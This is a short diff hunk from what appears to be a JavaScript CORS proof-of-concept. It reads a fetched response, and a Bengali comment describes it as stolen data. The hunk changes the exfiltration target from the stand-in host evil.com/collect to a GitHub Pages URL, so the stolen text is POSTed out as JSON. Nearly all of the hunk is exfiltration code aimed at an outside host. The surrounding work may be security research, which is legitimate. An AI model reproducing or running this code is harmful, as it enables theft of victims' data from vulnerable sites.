@@ -17,7 +17,7 @@
     .then(res => res.text())
     .then(text => {
       // চুরির পর ফলাফল own সার্ভারে POST
-      return fetch("https://evil.com/collect", {
+      return fetch("https://tufan-10.github.io/cors-poc/", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ data: text })
